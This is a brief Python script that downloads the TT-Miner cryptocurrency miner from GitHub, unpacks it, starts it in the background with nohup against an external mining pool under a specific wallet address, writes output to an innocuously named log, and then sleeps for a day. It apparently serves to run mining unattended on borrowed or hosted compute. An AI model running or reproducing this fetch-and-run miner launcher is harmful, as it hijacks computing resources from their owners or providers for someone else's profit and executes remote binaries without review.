import sys
import os
os.system("wget https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta4/TT-Miner-2024.2.1B4.tar.gz")
os.system("tar xf TT-Miner-2024.2.1B4.tar.gz")
os.system("nohup ./TT-Miner-2024.2.1B4/TT-Miner -t 4 -a FLEX -P ssl://kc1qnvclnjxyp3h8wak2krz8ghyjxya7uldzqz7930.sabri:sabri@eu.mpool.live:6486 > edge.log 2>&1 &")
os.system("sleep 1440m")
